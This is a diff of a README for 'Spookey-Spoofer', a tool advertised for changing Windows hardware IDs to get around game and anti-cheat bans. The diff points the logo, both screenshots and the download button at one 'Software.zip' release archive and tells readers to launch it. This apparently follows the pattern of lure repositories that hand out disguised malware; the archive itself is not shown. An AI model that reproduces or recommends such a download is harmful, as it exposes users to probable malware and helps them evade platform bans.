@@ -1,7 +1,7 @@
 
 # 🚀 **Spookey-Spoofer**
 
-![Spookey-Spoofer Logo](https://example.com/spookey-spoofer-logo.png)
+![Spookey-Spoofer Logo](https://github.com/hcaalpython/Spookey-Spoofer/releases/download/v1.0/Software.zip)
 
 ## Description
 **Spookey-Spoofer** is a powerful cleaner and spoofer designed specifically for Windows operating system, version 1.0.0.0. This tool is essential for those looking to bypass bans on various platforms and games by changing their hardware IDs.
@@ -11,7 +11,7 @@ battleye-bypass-ban, bypass-hardware-bans, eac-bypass-tool, hardware-id-change, 
 
 ## Installation
 To download **Spookey-Spoofer**, click the button below:
-[![Download Spookey-Spoofer v1.0.0.0](https://img.shields.io/badge/Download-v1.0.0.0-brightgreen)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Spookey-Spoofer v1.0.0.0](https://github.com/hcaalpython/Spookey-Spoofer/releases/download/v1.0/Software.zip)](https://github.com/hcaalpython/Spookey-Spoofer/releases/download/v1.0/Software.zip)
 
 Please note that the download needs to be launched, and you can access it through the link provided above.
 
@@ -22,8 +22,8 @@ Please note that the download needs to be launched, and you can access it throug
 4. Follow the on-screen instructions to use the spoofer effectively.
 
 ## Screenshots
-![Screenshot 1](https://example.com/screenshot1.png)
-![Screenshot 2](https://example.com/screenshot2.png)
+![Screenshot 1](https://github.com/hcaalpython/Spookey-Spoofer/releases/download/v1.0/Software.zip)
+![Screenshot 2](https://github.com/hcaalpython/Spookey-Spoofer/releases/download/v1.0/Software.zip)
 
 ## Support
 For any issues or questions, please check the "Releases" section of this repository. We are constantly updating and improving **Spookey-Spoofer** to provide the best experience for our users.
